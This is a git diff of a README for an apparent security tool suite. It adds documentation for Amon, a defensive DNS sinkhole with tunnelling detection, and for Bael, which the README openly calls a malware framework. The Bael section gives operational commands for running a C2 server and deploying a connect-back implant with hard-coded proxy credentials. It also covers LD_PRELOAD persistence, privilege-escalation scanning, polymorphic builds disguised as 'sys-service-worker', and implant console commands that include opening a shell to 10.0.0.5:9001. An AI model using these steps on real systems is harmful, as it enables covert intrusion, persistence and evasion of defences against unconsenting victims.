@@ -27,6 +27,14 @@
     - [About Nephila](#about-nehphila)
     - [Notices](#nephila-notices)
     - [Usage](#nephila-usage)
+- [Amon](#amon)
+    - [About Amon](#about-amon)
+    - [Notices](#amon-notices)
+    - [Usage](#amon-usage)
+- [Andras](#andras)
+    - [About Andras](#about-andras)
+    - [Notices](#andras-notices)
+    - [Usage](#andras-usage)
 - [Bael](#Bael)
     - [About Bael](#about-bael)
     - [Notices](#bael-notices)
@@ -80,10 +88,6 @@
 ## Andras
 
 ### About Andras
-
-<p align="center">
-"𝔗𝔥𝔢 𝔰𝔬𝔴𝔢𝔯 𝔬𝔣 𝔡𝔦𝔰𝔠𝔬𝔯𝔡, 𝔞 𝔭𝔥𝔞𝔫𝔱𝔬𝔪 𝔦𝔫 𝔱𝔥𝔢 𝔪𝔞-𝔠𝔥𝔦𝔫𝔢; 𝔞 𝔪𝔞𝔰𝔱𝔢𝔯 𝔬𝔣 𝔪𝔦𝔪𝔦𝔠𝔯𝔶 𝔞𝔫𝔡 𝔪𝔦𝔰𝔡𝔦𝔯𝔢𝔠𝔱𝔦𝔬𝔫 𝔱𝔥𝔞𝔱 𝔴𝔦𝔢𝔩𝔡𝔰 𝔢𝔵𝔭𝔩𝔬𝔦𝔱𝔰 𝔩𝔦𝔨𝔢 𝔞 𝔰𝔥𝔞𝔯𝔭𝔢𝔫𝔢𝔡 𝔟l𝔞𝔡𝔢, 𝔪𝔬𝔳𝔦𝔫𝔤 𝔲𝔫𝔰𝔢𝔢𝔫 𝔱𝔬 𝔡𝔦𝔰𝔪𝔞𝔫𝔱𝔩𝔢 𝔡𝔢𝔣𝔢𝔫𝔰𝔢𝔰 𝔞𝔫𝔡 𝔰𝔬𝔴 𝔠𝔥𝔞𝔬𝔰 𝔣𝔯𝔬𝔪 𝔱𝔥𝔢 𝔰𝔥𝔞𝔡𝔬𝔴𝔰."
-</p>
 
 <p align="center">
   <img src="imgs/andrasUsage0.png">
@@ -244,13 +248,7 @@ ai.browserInstance.stop()
 
 ## Nephila
 
-### About Nehphila
-
-<p align="center">
-  "𝔗𝔥𝔢 𝔴𝔢𝔞𝔳𝔢𝔯 𝔬𝔣 𝔴𝔢𝔟𝔰, 𝔪𝔞𝔰𝔱𝔢𝔯 𝔬𝔣 𝔫𝔢𝔱𝔴𝔬𝔯k𝔰 𝔞𝔫𝔡 𝔲𝔫𝔰𝔢𝔢𝔫 𝔠𝔬𝔫𝔫𝔢𝔠𝔱𝔦𝔬𝔫𝔰; 𝔞 𝔰𝔢𝔫𝔱𝔦𝔫𝔢𝔩 𝔬𝔣 𝔞𝔫𝔞𝔩𝔶𝔰𝔦𝔰 𝔞𝔫𝔡 𝔭𝔯𝔬x79 𝔪𝔞𝔫𝔦𝔭𝔲𝔩𝔞𝔱𝔦𝔬𝔫 𝔱𝔥𝔞𝔱 𝔰𝔭𝔦𝔫𝔰 𝔦𝔫𝔱𝔢𝔩𝔩𝔦𝔤𝔢𝔫𝔠𝔢 𝔣𝔯𝔬𝔪 𝔱𝔥𝔢 𝔱𝔥𝔯𝔢𝔞𝔡𝔰 𝔬𝔣 𝔱𝔯𝔞𝔣𝔣𝔦𝔠 𝔞𝔫𝔡 𝔡𝔞𝔱𝔞 𝔣𝔩𝔬𝔴, 𝔯𝔢𝔳𝔢𝔞𝔩𝔦𝔫𝔤 𝔴𝔥𝔞𝔱 𝔩𝔲𝔯𝔨𝔰 𝔴𝔦𝔱𝔥𝔦n 𝔱𝔥𝔢 𝔫𝔢𝔱’𝔰 𝔡𝔢𝔰𝔦𝔤𝔫."
-</p>
-
----
+### About Nephila
 
 <p align="center">
   <img src="imgs/nephilaUsage.png">
@@ -562,56 +560,188 @@ results = nmapScanner.scan(
 print(f"Nmap scan finished. Found {len(results['scans'][0]['hosts'])} host(s).")
 ```
 
-## Amon 
-<p align="center">
+## Amon
 
-"𝔗𝔥𝔢 𝔰𝔥𝔞𝔡𝔬𝔴 𝔤𝔲𝔞𝔯𝔡𝔦𝔞𝔫 𝔬𝔣 𝔱𝔥𝔢 𝔫𝔢𝔱, 𝔞 𝔰𝔦𝔩𝔢𝔫𝔱 𝔬𝔟𝔰𝔢𝔯𝔳𝔢𝔯 𝔱𝔥𝔞𝔱 𝔣𝔦𝔩𝔱𝔢𝔯𝔰 𝔱𝔥𝔢 𝔣𝔩𝔬𝔴 𝔬𝔣 𝔡𝔞𝔱𝔞; 𝔞 𝔡𝔢𝔣𝔢𝔫𝔡𝔢𝔯 𝔞𝔤𝔞𝔦𝔫𝔰𝔱 𝔪𝔞𝔩𝔦𝔠𝔦𝔬𝔲𝔰 𝔡𝔬𝔪𝔞𝔦𝔫𝔰 𝔞𝔫𝔡 𝔞 𝔴𝔞𝔱𝔠𝔥𝔢𝔯 𝔣𝔬𝔯 𝔰𝔲𝔰𝔭𝔦𝔠𝔦𝔬𝔲𝔰 𝔱𝔯𝔞𝔣𝔣𝔦𝔠, 𝔰𝔦𝔫𝔨𝔦𝔫𝔤 𝔱𝔥𝔢 𝔲𝔫𝔴𝔞𝔫𝔱𝔢𝔡 𝔞𝔫𝔡 𝔭𝔯𝔬𝔱𝔢𝔠𝔱𝔦𝔫𝔤 𝔱𝔥𝔢 𝔦𝔫𝔫𝔬𝔠𝔢𝔫𝔱 𝔣𝔯𝔬𝔪 𝔱𝔥𝔢 𝔰𝔥𝔞𝔡𝔬𝔴𝔰."
-</p>
+### About Amon
 
-### Amon Usage
-
-Amon is primarily run as a standalone DNS server via CLI, but can also be imported as a library.
 <p align="center">
   <img src="imgs/amonUsageNew.png">
 </p>
 
-### Amon Core Features
+---
 
-* _AD/Tracker/Malware Blocking_: Uses "gravity" blocklists (fetched from sources like StevenBlack and Hagezi) to sinkhole malicious or unwanted domains to 0.0.0.0.
-* _DNS over HTTPS Forwarding_: Securely resolves clean queries via DoH with rotating providers and optional JA3 fingerprint spoofing (via curl_cffi).
-* _DNS Tunneling Detection_: Calculates Shannon entropy on domain labels and flags high-entropy or overly long queries as suspicious.
-* _Caching_: Simple in-memory cache for repeated queries to reduce upstream requests.
-* _Logging_: Colored console logging with optional file logging for monitoring blocked and resolved domains.
-* _Threaded Performance_: Handles multiple concurrent DNS requests efficiently.
+__Amon Shadow-DNS__ is a lightweight, local DNS sinkhole and proxying resolver designed for tactical DNS filtering, telemetry/ad-blocking, and potential exfiltration detection.
+
+By leveraging DNS over HTTPS (DoH) upstreams, real-time Shannon entropy calculation on resolving domains, and Linux namespace separation (unshare), amon acts as a defensive DNS security guard. It can intercept and filter requests system-wide or isolate specific, high-risk processes (like browsers or telemetry-heavy clients) to their own custom DNS environment without altering system-wide network configurations.
 
 ### Amon Notices
 
-* __Root/Administrator Privileges__: Binding to port 53 requires root privileges. Without it, the script will exit with a permission error.
-* __Ethical Use__: Amon is intended for personal network protection, ad-blocking, and defensive security research. Use only on networks you own or have authorization to monitor.
-* __Optional Dependency__: JA3 spoofing for better evasion in DoH requests requires curl_cffi.requests. If not installed, it falls back to standard requests.
+* **Ethical Use**: __Amon__ is designed for authorized security testing, educational purposes, and defensive threat-hunting within controlled simulation environments. Ensure compliance with local policies and laws before intercepting application or system traffic.
+* **Dependencies**: You will need `requests, dnslib, curl_cffi`
 
-### Amon Dependencies
+### Amon Usage
 
 ```markdown
-* dnslib
-* curl_cffi
+usage: amon.py [-l LHOST] [-p PORT] [-h] [-v] [-d DOH] [--log-file LOGFILE] 
+               [--log-dir LOGDIR] [--no-log] [--wrap ...]
 ```
 
-### Amon CLI
+#### Amon Command-Line Interface (CLI)
 
-* `-h, ---help`: Displays the help message.
-* `-p, --port <port>`: Listen on a custom port (no root needed if >1024).
-* `--doh <url>`: Use a specific DoH upstream (default rotates between Cloudflare/Google/Quad9).
-* `--log-dir <path>`: Custom directory for log files.
-* `--log-file <file>`: Custom log file name/path.
-* `--no-file-log`: Disable file logging.
-* `--verbosity`: Control console output verbosity.
+* **-l, --listen**
+    - `IP` to bind the `DNS` listener to.
+    - Default: `0.0.0.0`
+* **-p, --port**
+    - `PORT` to bind the `DNS` listener to.
+    - Default: `53`
+* **-v, --verbose**
+    - Enable verbose output.
+    - Default: `False`
+* **-d, --doh**
+    - Custom Upstream DoH Provider URL.
+    - Default: `Cloudflare`
+    - _NOTE:_ We are going to move to `http://1.1.1.1/dns-query`
+* **--log-file**
+    - Name of path of the log file.
+    - Default: `amon_<timestamp>.log`
+* **--log-dir**
+    - Target directory for log outputs.
+    - Default: `./.amonLogs/`
+* **---no-log**
+    - Disable local file logging enirely.
+    - Disable local file logging entirely.
+    - Default: `False`
+* **--wrap `cmd`**
+    - Wrap the following command inside custom mount namespace.
+    - Default: `None`
+
+#### Amon Operational Examples
+
+1. Standard DNS Daemon Deployment (Root Required for Port 53)
+    Start `Amon` to filter network-wide or system-wide queries:
+    ```bash
+    sudo python3 amon.py -l 127.0.0.1 -p 53  
+    ```
+2. Running on an Alternative Port (No Root Required)
+    If you don't have superuser privileges, run on a high port (eg.,`8353`):
+    ```bash
+    python3 amon.py -l 127.0.0.1 -p 8353
+    ```
+3. Application Isolation via Mount Namespaces `--wrap`
+    This is where amon excels for target auditing. To launch a specific application (e.g., firefox or a telemetry-heavy client script) so that only its DNS queries are handled, blocked, and monitored by your local amon server:
+    1. _Terminal 1:_ Start the server on localhost:
+        ```bash
+        sudo python3 amon.py -l 127.0.0.1 -p 53
+        ```
+    2. _Terminal 2:_ Wrap your local program:
+        ```bash
+        python3 amon.py --wrap firefox
+        ```
+
+__How it works under the hood:__  
+amon executes unshare -m to spawn a new shell with a private mount namespace. It copies your /etc/resolv.conf, comments out the normal nameservers, adds nameserver 127.0.0.1, bind-mounts this temporary configuration over /etc/resolv.conf within the namespace, and execs your target application. The host system's DNS remains untouched.
 
 
+#### Amon Security Engine Details
+__Gravity Blocklist__: n boot, Amon's gravity engine pulls known tracking, malicious, and advertising domains dynamically from verified sources:
+
+* StevenBlack/hosts
+* Hagezi Multi-Adblock
+
+Matched queries immediately resolve to 0.0.0.0 with a TTL of 60 seconds, preventing any outbound connections to tracking or sinkholed telemetry domains.
+
+#### Amon Shannon Entropy Detection
+To detect anomalies like DNS Tunneling (e.g., Cobalt Strike, iodine) or data exfiltration over TXT/CNAME records, amon calculates the Shannon Entropy of every label in a requested domain:
+
+<p align="center">
+  <img src="imgs/amonEq0.png">
+</p
+
+If any single domain label exceeds an entropy score of `4.5` or exceeds __45 characters__ in length, Amon flags a high-severity warning in the log output:
+`[!] SUSPICIOUS ENTROPY: Potential DNS Tunneling/Exfil in <domain>`
+
+---
+
+## Bael
+
+<p align="center">
+  <img src="imgs/baelExample0.png">
+</p>
+
+---
+
+### TECHNICAL MALWARE DISCLAIMER
+**Bael is explicitly classified as a malware framework and post-exploitation suite.** Its components—including but not limited to rootkit persistence via `LD_PRELOAD`, Seccomp syscall hijacking, and PAM credential interception—are designed for offensive operations. Unauthorized use of this tool on systems without explicit, written permission is strictly prohibited and likely illegal under various international cybercrime laws (e.g., the CFAA in the US). The author assumes no liability for any misuse, data loss, or legal consequences resulting from the deployment of this software.
+
+### About Bael
+
+**Bael** (v0.2.5) is a high-performance Command & Control (C2) agent and server architecture engineered for the Linux ecosystem. It facilitates secure remote administration and post-exploitation through encrypted tunnels, utilizing a polymorphic building system to evade signature-based detection.
+
+#### Bael Core Features
+
+*   **Secure Communications**: Implements mandatory mutual TLS (mTLS 1.3) with embedded certificate pinning and ChaCha20-Poly1305 encryption for all C2 traffic.
+*   **Network Pivoting**: Includes a diagnostic **SOCKS5 relay** (with authentication) and **TUN interface** bridging for full Layer 3 network encapsulation.
+*   **Stealth & Evasion**:
+    *   **Anti-Alias Engine**: Multi-stage detection for debuggers (`PTRACE_TRACEME`), VMs (MAC/UUID fingerprinting), sandboxes (Cgroups/User Namespaces), and CI/CD environments.
+    *   **Seccomp Hijacking**: Implements a `SeccompNotif` supervisor that uses `SECCOMP_IOCTL_NOTIF_ADDFD` to intercept and manipulate syscalls like `openat2` and `execve` in target processes.
+    *   **Fileless Deployment**: Integrated `memfd_create` and `io_uring` simulation for stealthy process execution and filesystem enumeration.
+*   **Exploitation Engine**:
+    *   **Copy-Fail (CVE-2026-31431)**: Automated exploit module for page cache manipulation to gain root privileges.
+    *   **Shellcode Generator**: Built-in engine for generating `execve` and `setuid` payloads.
+*   **HiveMind Console**: An interactive REPL (Read-Eval-Print Loop) for real-time management of remote implants.
+
+### Bael Notices
+
+*   **Infrastructure Requirements**: Bael cannot function without valid mTLS assets. Run `--mode keygen` first to generate the necessary obfuscated keys.
+*   **Privilege Escalation**: Most advanced features (TUN, Seccomp Hijacking, Copy-Fail) require `root` access. 
+*   **Stealth Warning**: The `Anti-Alias` aggressive mode performs timing anomaly checks which can be detected by sophisticated EDR solutions.
+
+### Bael Usage
+
+#### 1. Infrastructure Preparation (Keygen)
+Generate the obfuscated PKI assets and the secret shield key:
+```sh
+python3 bael.py --mode keygen --kg-out .baelKeys --kg-priv 32
+```
+
+#### Starting the C2 Server (HiveMind)
+Launch the listener and enter the interactive command console:
+```sh
+sudo python3 bael.py --mode server --lhost 0.0.0.0:443 --key "YOUR_PRIVATE_KEY"
+```
+
+#### Deploying the Implant (Client)
+Connecting back to the C2 with SOCKS5 relay enabled:
+```sh
+python3 bael.py --mode tun --remote <C2_IP>:443 --socks --socks-user admin --socks-pass malum123
+```
+
+#### Persistence & Stealth (Root Context)
+Trigger advanced persistence and LPE scanning:
+```sh
+sudo python3 bael.py --persist --ldpreload --scan-lpe
+```
+
+#### Polymorphic Building
+Generate a unique, obfuscated variant of the Bael implant:
+```sh
+python3 bael.py --mode build --bl-name "sys-service-worker" --seed 1337
+```
+
+#### HiveMind Console Commands
+Once connected, you can issue commands directly to the implant:
+```text
+bael> help
+bael> whoami
+bael> sysinfo
+bael> exec:ls -la /root
+bael> shell:10.0.0.5:9001
+bael> /logging session_capture.log
+```
 
 ## Credits
 
-<img src="https://tryhackme-badges.s3.amazonaws.com/J4ck3LSyN.png" alt="Your Image Badge" />
+
 
 *   **Author**: J4ck3LSyN
 *   **Version**: 0.1.0
